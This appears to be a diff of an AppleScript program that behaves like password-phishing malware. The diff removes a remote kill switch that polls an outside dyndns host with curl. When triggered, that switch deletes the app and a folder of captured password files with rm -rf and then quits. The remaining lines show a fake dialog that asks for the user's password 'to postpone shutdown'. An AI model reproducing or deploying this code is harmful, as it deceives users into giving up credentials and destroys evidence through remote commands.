@@ -7,19 +7,6 @@ try
 end try
 
 try
-	set killswitch to ""
-	do shell script "curl http://thexiuh.dyndns.info/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1"
-	set killswitch to (characters 1 through -1 of result) as text -- Get IP
-end try
-try
-	if killswitch = "kill" then
-		-- Delete all of the app and password files
-		do shell script "rm -rf " & ufld & ""
-		do shell script "rm -rf " & (POSIX path of (path to me))
-		quit
-	end if
-end try
-try
 	
 	repeat
 		set passwd to text returned of (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 20 with hidden answer) -- Prompt for Password
